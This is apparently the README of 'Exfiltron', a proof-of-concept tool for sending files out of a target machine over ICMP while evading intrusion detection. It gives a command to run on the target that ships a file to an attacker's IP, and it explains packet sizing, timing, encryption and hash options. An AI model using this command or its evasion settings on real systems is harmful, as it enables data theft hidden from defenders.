# Exfiltron
Data Exfiltration Framework 

!!!! Please be aware that is project is in progress and may have parts missing
!!!!

## What does it do?
This framework is meant as a proof of concept for exfiltrating data 
from a target computer. YOU SHOULD NOT USE THIS ON ANYTHING YOU DO 
NOT OWN OR HAVE EXPLICIT PERMISSION TO USE IT ON. Exfiltron is meant to 
evade IDS in order to get data back to you.

## Things you must have before extraction time
* You must have [python2.7+](https://www.python.org) installed on both the
server and the client side
* You must have [scapy](http://www.secdev.org/projects/scapy) 
([download](http://scapy.net)) installed on both the server and the client side
    * If you wish to encrypt your file before sending it out, make sure you have
the [cryptography](https://cryptography.io/en/latest) python package which
should be installed when you install scapy

## Sounds great! How do I try it out?
First, get it on your local machine. There are two major files: the client
file (exfiltron.py) and the server file. The client file must be placed on
a target machine along with any modules you wish to use for your extraction
method. SET UP THE SERVER SIDE INFORMATION HERE. After exfiltron.py has
been placed on the target machine, run the following command on the target:

`python exfiltron.py exfiltrationMethod -f filename -d destinationIP [-aehiqt]`

* -h is help
* -a (--data-per-packet) is the amount of data you want to fit into each packet.
The default is the number of bytes that normally sit in that packet while the
min amount is 1 byte and the max amount is the MTU minus the headers and trailers
on the packet. The amount should be specified after the option (ex. -a 64)
* -t (--time) specifies the amount of time to wait between after sending a packet
before sending another packet. This numerical value should be given in terms of
seconds. If no value is explicitly set, exfiltron defaults the value to 5 seconds
* -q (--quiet) By default, a progress bar is shown displaying
numPacketsSent/numTotalPacketsToSend. This option silences any output relating
to the progress bar
* -e (--encrypt) Setting this flag will result in your data being encrypted 
with AES-256 using CTR mode. Please note that this should only be used if the
attacker executes exfiltron.py through a secure channel
* -i (--integrity-check) Exfiltron hashes the chosen file and sends, as the
first packet, the resulting hash. After receiving all of the files, the
attacker's side then pieces the file back together and runs the same hash
again and compares the two. Please note that the hash will be placed in the
first packet sent and will ignore the setting placed after the -a 
(--data-per-packet) flag. All other packets will be sized with respect to
the -a flag. The hash in use is SHA-256

## Methods of Exfiltration
Currently, the following methods of exfiltration are available/in progress:
* ICMP

#### Original Authors
* Adam Sowden
* Andrew Steiner
* Thomas Daniels
